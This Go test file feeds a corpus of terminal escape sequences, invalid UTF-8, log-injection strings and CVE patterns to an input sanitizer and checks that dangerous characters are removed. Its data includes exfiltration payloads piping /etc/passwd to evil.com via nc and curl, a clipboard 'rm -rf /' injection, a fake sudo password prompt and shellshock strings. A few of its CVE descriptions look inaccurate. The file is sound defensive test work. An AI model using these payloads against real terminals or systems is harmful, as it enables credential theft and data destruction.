// pkg/security/corpus_test.go
// Comprehensive security test corpus with real-world attack vectors

package security

import (
	"fmt"
	"strings"
	"testing"
	"unicode/utf8"
)

// SecurityCorpus contains real-world attack vectors for comprehensive testing
type SecurityCorpus struct {
	// CSI Injection Attacks (CVE-2022-24765 related)
	CSIAttacks []string

	// ANSI Escape Sequence Attacks
	ANSIAttacks []string

	// UTF-8 Validation Attacks
	UTF8Attacks []string

	// Terminal Manipulation Exploits
	TerminalExploits []string

	// Log Injection Attacks
	LogInjectionAttacks []string

	// Complex Attack Chains
	ComplexAttacks []string

	// Parser State Confusion Attacks
	ParserConfusionAttacks []string

	// Known CVE Patterns
	CVEPatterns []string
}

// GetSecurityCorpus returns a comprehensive collection of real-world attack vectors
func GetSecurityCorpus() *SecurityCorpus {
	return &SecurityCorpus{
		CSIAttacks: []string{
			// CVE-2022-24765: Git credential theft via CSI sequences
			string(rune(0x9b)) + "6n",                                // Device Status Report
			string(rune(0x9b)) + "0c",                                // Device Attributes
			string(rune(0x9b)) + "5n",                                // Status Report
			"username" + string(rune(0x9b)) + "6n" + "password",      // Embedded in credentials
			"git clone https://evil.com" + string(rune(0x9b)) + "6n", // Git-specific attack
			string(rune(0x9b)) + "200~",                              // Bracketed paste mode
			string(rune(0x9b)) + "?1004h",                            // Focus reporting
			string(rune(0x9b)) + "?2004h",                            // Bracketed paste

			// Variations with different sequences
			string(rune(0x9b)) + "[A",   // Cursor up with CSI
			string(rune(0x9b)) + "[2J",  // Clear screen with CSI
			string(rune(0x9b)) + "[H",   // Cursor home with CSI
			string(rune(0x9b)) + "[31m", // Color with CSI
			string(rune(0x9b)) + "c",    // Terminal identification
			string(rune(0x9b)) + "6c",   // Cursor position report
		},

		ANSIAttacks: []string{
			// Terminal title manipulation
			"\x1b]0;/bin/sh\x07",                        // Set terminal title to shell
			"\x1b]0;curl http://evil.com/$(whoami)\x07", // Data exfiltration via title
			"\x1b]0;\x1b[2J\x1b[H\x07",                  // Clear screen via title

			// Cursor manipulation attacks
			"\x1b[1000D\x1b[K",   // Move cursor left and clear
			"\x1b[2J\x1b[H",      // Clear screen and home
			"\x1b[999C\x1b[999B", // Move cursor to edge

			// Color bombing attacks
			"\x1b[31m\x1b[41m\x1b[5m\x1b[1m", // Multiple formatting
			strings.Repeat("\x1b[31m", 1000), // Color spam

			// Screen manipulation
			"\x1b[?25l",            // Hide cursor
			"\x1b[?1049h",          // Alternative screen buffer
			"\x1b[r",               // Reset scroll region
			"\x1b[2J\x1b[H\x1b[2J", // Double clear

			// Input sequence attacks
			"\x1b[200~malicious_input\x1b[201~", // Bracketed paste injection
			"\x1b[>0;276;0c",                    // Device attributes response

			// Operating System Commands (OSC)
			"\x1b]52;c;$(base64 /etc/passwd)\x07", // Clipboard manipulation
			"\x1b]4;0;rgb:ff/00/00\x07",           // Color palette manipulation
			"\x1b]10;?\x07",                       // Query foreground color
			"\x1b]11;?\x07",                       // Query background color
		},

		UTF8Attacks: []string{
			// Invalid UTF-8 sequences
			"\xff\xfe",         // Invalid start bytes
			"\xc0\x80",         // Overlong encoding of null
			"\xc1\xbf",         // Overlong encoding
			"\xe0\x80\x80",     // Overlong 3-byte sequence
			"\xf0\x80\x80\x80", // Overlong 4-byte sequence
			"\xf4\x90\x80\x80", // Out of Unicode range
			"\xc2",             // Incomplete 2-byte sequence
			"\xe2\x82",         // Incomplete 3-byte sequence
			"\xf0\x9f\x98",     // Incomplete 4-byte sequence

			// UTF-8 BOM attacks
			"\xef\xbb\xbf" + "normal text",   // BOM prefix
			"text" + "\xef\xbb\xbf" + "more", // BOM in middle

			// Mixed valid/invalid sequences
			"hello\xff\xfeworld",       // Invalid in middle
			"\xc2\xa9\xff\xfe\xc2\xa9", // Valid, invalid, valid

			// NULL byte attacks with UTF-8
			"test\xc0\x80end",  // Overlong null
			"file.txt\x00.exe", // NULL byte file extension
		},

		TerminalExploits: []string{
			// CVE-2003-0063: Terminal escape sequence vulnerabilities
			"\x1b]2;`id`\x07",                    // Command injection via title
			"\x1b]0;$(curl http://evil.com)\x07", // Network request via title

			// CVE-2018-6791: KDE terminal exploitation
			"\x1b]1337;File=name=\x07:$(id)\x07", // iTerm2 file transfer exploit

			// Privilege escalation attempts
			"\x1b]0;sudo -s\x07\n",                    // Fake sudo prompt
			"\x1b[2J\x1b[H[sudo] password for user: ", // Fake password prompt

			// Data exfiltration
			"\x1b]0;$(cat /etc/passwd | nc evil.com 1234)\x07", // Password file exfiltration
			"\x1b]52;c;$(echo $SSH_AUTH_SOCK | base64)\x07",    // SSH socket exposure

			// Terminal identification attacks
			"\x1b[>c",  // Primary device attributes
			"\x1b[>0c", // Secondary device attributes
			"\x1b[c",   // Device attributes request

			// Clipboard manipulation
			"\x1b]52;c;$(echo 'rm -rf /' | base64)\x07", // Malicious clipboard set
			"\x1b]52;c;?\x07", // Clipboard query
		},

		LogInjectionAttacks: []string{
			// Log injection with newlines
			"user\nINFO: Fake log entry",            // Newline injection
			"user\rINFO: Carriage return injection", // CR injection
			"user\n\n[ERROR] Fake error\n\n",        // Multi-line injection

			// CRLF injection
			"user\r\nHost: evil.com\r\n\r\n",          // HTTP header injection
			"param\r\nSet-Cookie: session=stolen\r\n", // Cookie injection

			// Control character injection
			"user\x00hidden",               // NULL byte hiding
			"user\x08\x08\x08admin",        // Backspace manipulation
			"user\x1b[2K\x1b[Gadmin login", // Terminal control in logs

			// Format string attacks
			"user%n%n%n%n",     // Format string
			"user%08x%08x%08x", // Format string leak
			"user%s%s%s%s",     // String format attack
		},

		ComplexAttacks: []string{
			// Multi-stage attacks combining multiple techniques
			"\x1b]0;" + string(rune(0x9b)) + "6n$(whoami)\x07",    // OSC + CSI + injection
			"\x1b[2J\x1b[H" + string(rune(0x9b)) + "[31m\xff\xfe", // Clear + CSI + invalid UTF-8
			"user\n\x1b]0;$(id)\x07\r\nFake: log",                 // Multi-vector injection

			// Nested escape sequences
			"\x1b]0;\x1b[31m\x1b]0;nested\x07\x07", // Nested OSC sequences
			"\x1b[\x1b[31m1m",                      // Nested CSI sequences

			// State confusion attacks
			"\x1b]2;title\x1b\\next\x1b]2;title2\x07", // Mixed terminators
			"\x1b[?1h\x1b[?1l\x1b[?1h",                // Rapid mode switching

			// Buffer overflow attempts
			strings.Repeat("\x1b[31m", 10000),               // Massive escape spam
			strings.Repeat(string(rune(0x9b)), 1000) + "6n", // CSI spam
			"\x1b]0;" + strings.Repeat("A", 10000) + "\x07", // Long title attack
		},

		ParserConfusionAttacks: []string{
			// State machine confusion
			"\x1b[", // Incomplete CSI
			"\x1b]", // Incomplete OSC
			"\x1bP", // Incomplete DCS
			"\x1b_", // Incomplete APC
			"\x1b^", // Incomplete PM

			// Mixed control/data
			"\x1b[31mred\x00null\x1b[0m",    // ANSI + null + ANSI
			"data\x1b[31mcolor\xff\xfemore", // Data + ANSI + invalid UTF-8

			// Partial sequences with timing attacks
			"\x1b",     // Just ESC
			"\x1b[",    // ESC + [
			"\x1b[31",  // Partial color code
			"\x1b[31;", // Partial with semicolon

			// Character encoding confusion
			"\xc2\x9b[31m",     // UTF-8 encoded CSI
			"\x1b\xc2\x9b[31m", // ESC + UTF-8 CSI
		},

		CVEPatterns: []string{
			// CVE-2022-24765: Git on Windows credential theft
			"git clone https://github.com/victim/repo" + string(rune(0x9b)) + "6n",

			// CVE-2021-33909: Linux filesystem path traversal
			"../../../../../../../../../../../../etc/passwd\x00.txt",

			// CVE-2019-18634: sudo buffer overflow
			"sudo " + strings.Repeat("A", 1000),

			// CVE-2018-15919: SSH username enumeration
			"ssh-2.0-libssh_0.8.1\x00\x00\x00\x0c",

			// CVE-2017-1000367: sudo privilege escalation
			"sudo -u#-1 /bin/bash",

			// CVE-2014-6271: Shellshock
			"() { :; }; echo vulnerable",
			"() { _; } >_[$($())] { echo vulnerable; }",

			// CVE-2012-0809: sudo format string
			"sudo -u %08x%08x%08x /bin/bash",

			// CVE-2008-5161: OpenSSH X11 forwarding
			"\x1b]0;display=:0.0\x07",

			// Terminal-specific CVEs
			"\x1b]1337;File=name=`id`\x07",                       // iTerm2 RCE
			"\x1b]133;A\x07malicious\x1b]133;B\x07",              // Terminal prompt marking
			"\x1b]8;;https://evil.com\x07click here\x1b]8;;\x07", // Hyperlink injection
		},
	}
}

// TestSecurityCorpusAgainstSanitizer runs the complete security corpus against our sanitizer
func TestSecurityCorpusAgainstSanitizer(t *testing.T) {
	corpus := GetSecurityCorpus()
	sanitizer := NewInputSanitizer()
	strictSanitizer := NewStrictSanitizer()

	testCases := []struct {
		name      string
		attacks   []string
		useStrict bool
	}{
		{"CSI Injection Attacks", corpus.CSIAttacks, false},
		{"ANSI Escape Attacks", corpus.ANSIAttacks, false},
		{"UTF-8 Validation Attacks", corpus.UTF8Attacks, false},
		{"Terminal Exploitation", corpus.TerminalExploits, true},
		{"Log Injection Attacks", corpus.LogInjectionAttacks, false},
		{"Complex Attack Chains", corpus.ComplexAttacks, true},
		{"Parser Confusion", corpus.ParserConfusionAttacks, false},
		{"CVE Patterns", corpus.CVEPatterns, true},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			activeSanitizer := sanitizer
			if tc.useStrict {
				activeSanitizer = strictSanitizer
			}

			for i, attack := range tc.attacks {
				t.Run(fmt.Sprintf("Attack_%d", i), func(t *testing.T) {
					// Test that sanitization doesn't panic
					defer func() {
						if r := recover(); r != nil {
							t.Errorf("Sanitizer panicked on attack %q: %v", attack, r)
						}
					}()

					result, err := activeSanitizer.SanitizeInput(attack)

					// Strict sanitizer may reject dangerous inputs
					if tc.useStrict && err != nil {
						// This is acceptable for strict mode
						return
					}

					if err != nil {
						t.Errorf("Sanitizer failed on attack %q: %v", attack, err)
						return
					}

					// Validate the result is safe
					if !utf8.ValidString(result) {
						t.Errorf("Sanitizer produced invalid UTF-8 for attack %q: result=%q", attack, result)
					}

					// Check for remaining dangerous characters
					if strings.ContainsRune(result, CSI) {
						t.Errorf("CSI character remains in result for attack %q: result=%q", attack, result)
					}

					if strings.ContainsRune(result, ESC) {
						t.Errorf("ESC character remains in result for attack %q: result=%q", attack, result)
					}

					// Check for control characters (except newline and tab)
					for _, r := range result {
						if r < 32 && r != '\n' && r != '\t' {
							t.Errorf("Dangerous control character 0x%02x found in result for attack %q: result=%q",
								r, attack, result)
						}
						if r >= 127 && r <= 159 && r != ReplacementChar {
							t.Errorf("Dangerous C1 control character 0x%02x found in result for attack %q: result=%q",
								r, attack, result)
						}
					}
				})
			}
		})
	}
}

// TestOriginalThreeVulnerabilities provides regression tests for the original vulnerabilities
func TestOriginalThreeVulnerabilities(t *testing.T) {
	sanitizer := NewInputSanitizer()

	t.Run("CSI_Injection_Regression", func(t *testing.T) {
		// Original vulnerability: 0x9b character injection
		attacks := []string{
			string(rune(0x9b)) + "6n",                // Device Status Report
			"user" + string(rune(0x9b)) + "password", // Embedded CSI
			string(rune(0x9b)) + "[31mcolored",       // CSI with ANSI
		}

		for _, attack := range attacks {
			result, err := sanitizer.SanitizeInput(attack)
			if err != nil {
				t.Errorf("Unexpected error for CSI attack %q: %v", attack, err)
				continue
			}

			if strings.ContainsRune(result, CSI) {
				t.Errorf("CSI vulnerability regression: CSI character not removed from %q, result=%q", attack, result)
			}
		}
	})

	t.Run("UTF8_Handling_Regression", func(t *testing.T) {
		// Original vulnerability: malformed UTF-8 sequences
		attacks := []string{
			"\xff\xfe",           // Invalid start bytes
			"\xc0\x80",           // Overlong encoding
			"hello\xff\xfeworld", // Invalid in middle
			"\xc2",               // Incomplete sequence
		}

		for _, attack := range attacks {
			result, err := sanitizer.SanitizeInput(attack)
			if err != nil {
				t.Errorf("Unexpected error for UTF-8 attack %q: %v", attack, err)
				continue
			}

			if !utf8.ValidString(result) {
				t.Errorf("UTF-8 vulnerability regression: invalid UTF-8 in result for %q, result=%q", attack, result)
			}
		}
	})

	t.Run("Parser_State_Confusion_Regression", func(t *testing.T) {
		// Original vulnerability: mixed control/binary data
		attacks := []string{
			"\x1b[31mred\x00null\x1b[0m", // ANSI + null + ANSI
			"data\x1b[31m\xff\xfemore",   // Data + ANSI + invalid UTF-8
			"\x1b]0;title\x00data\x07",   // OSC with null byte
		}

		for _, attack := range attacks {
			result, err := sanitizer.SanitizeInput(attack)
			if err != nil {
				t.Errorf("Unexpected error for parser confusion attack %q: %v", attack, err)
				continue
			}

			// Should be valid UTF-8
			if !utf8.ValidString(result) {
				t.Errorf("Parser confusion regression: invalid UTF-8 in result for %q", attack)
			}

			// Should not contain dangerous control characters
			for _, r := range result {
				if r == CSI || r == ESC {
					t.Errorf("Parser confusion regression: dangerous control character in result for %q", attack)
				}
				if r == 0 {
					t.Errorf("Parser confusion regression: null byte in result for %q", attack)
				}
			}
		}
	})
}

// TestComplexAttackChains validates that multi-stage attacks are properly handled
func TestComplexAttackChains(t *testing.T) {
	sanitizer := NewInputSanitizer()

	complexAttacks := []struct {
		name        string
		attack      string
		description string
	}{
		{
			"OSC_CSI_Command_Injection",
			"\x1b]0;" + string(rune(0x9b)) + "6n$(whoami)\x07",
			"OSC sequence containing CSI and command injection",
		},
		{
			"Multi_Stage_Terminal_Clear",
			"\x1b[2J\x1b[H" + string(rune(0x9b)) + "[31m\xff\xfe",
			"Clear screen, CSI color, and invalid UTF-8",
		},
		{
			"Nested_Escape_Sequences",
			"\x1b]0;\x1b[31m\x1b]0;nested\x07\x07",
			"Nested OSC sequences with color codes",
		},
		{
			"Log_Injection_With_Terminal_Control",
			"user\n\x1b]0;$(id)\x07\r\nFake: log entry",
			"Log injection combined with terminal title manipulation",
		},
		{
			"State_Machine_Confusion",
			"\x1b[\x1b[31m1m\x00\xff\xfe\x1b[0m",
			"Nested CSI with null bytes and invalid UTF-8",
		},
	}

	for _, tc := range complexAttacks {
		t.Run(tc.name, func(t *testing.T) {
			result, err := sanitizer.SanitizeInput(tc.attack)
			if err != nil {
				t.Errorf("Sanitizer failed on complex attack %s: %v", tc.description, err)
				return
			}

			// Comprehensive safety checks
			if !utf8.ValidString(result) {
				t.Errorf("Complex attack produced invalid UTF-8: %s", tc.description)
			}

			if strings.ContainsRune(result, CSI) {
				t.Errorf("Complex attack left CSI character: %s", tc.description)
			}

			if strings.ContainsRune(result, ESC) {
				t.Errorf("Complex attack left ESC character: %s", tc.description)
			}

			for _, r := range result {
				if r < 32 && r != '\n' && r != '\t' {
					t.Errorf("Complex attack left control character 0x%02x: %s", r, tc.description)
				}
			}

			t.Logf("Complex attack safely sanitized: %s -> %q", tc.description, result)
		})
	}
}
